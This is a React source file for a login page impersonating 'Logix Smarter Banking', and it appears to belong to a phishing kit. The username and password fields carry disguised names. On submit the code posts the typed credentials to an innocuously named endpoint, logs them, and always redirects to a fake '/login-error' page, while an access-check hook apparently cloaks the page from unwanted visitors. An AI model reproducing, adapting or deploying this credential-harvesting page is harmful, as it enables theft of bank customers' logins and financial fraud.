import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // If access is explicitly denied (not just loading), show loading
  if (!isAllowed) {
    return <div>Checking access...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };



  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };


    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password is required.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/logix-meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/login-error');
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
      <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Sign In – Welcome to Logix Smarter Banking</h2>
      </div>

      <div className="px-6 py-6 bg-white space-y-4">
        <form onSubmit={handleSubmit}>
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Username:</label>
            <input
              id="emzemz"
              name="emzemz"
              type="text"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
            />
          </div>

          {errors.emzemz && (
            <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
              <svg
                width="1rem"
                height="1rem"
                viewBox="0 0 24 24"
                className="fill-current text-red-600"
                aria-hidden="true"
              >
                <path
                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                  fillRule="nonzero"
                ></path>
              </svg>

              <p>Username required</p>
            </div>
          )}

          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Password:</label>
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
            />

            <span
              className="text-blue-700 text-sm hover:underline cursor-pointer"
              onClick={togglePwzenzVisibility}
            >
              {showPwzenz ? 'Hide' : 'Show'}
            </span>
          </div>

          {errors.pwzenz && (
            <div className="flex items-center gap-3 text-sm font-bold mt-2">
              <svg
                width="1rem"
                height="1rem"
                viewBox="0 0 24 24"
                className="fill-current text-red-600"
                aria-hidden="true"
              >
                <path
                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                  fillRule="nonzero"
                ></path>
              </svg>

              <p>Password required</p>
            </div>
          )}

          {!isLoading ? (
            <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Sign-In
              </button>
            </div>
          ) : (
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
          )}
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Username?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Password?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Everything?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Locked Out?</a>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
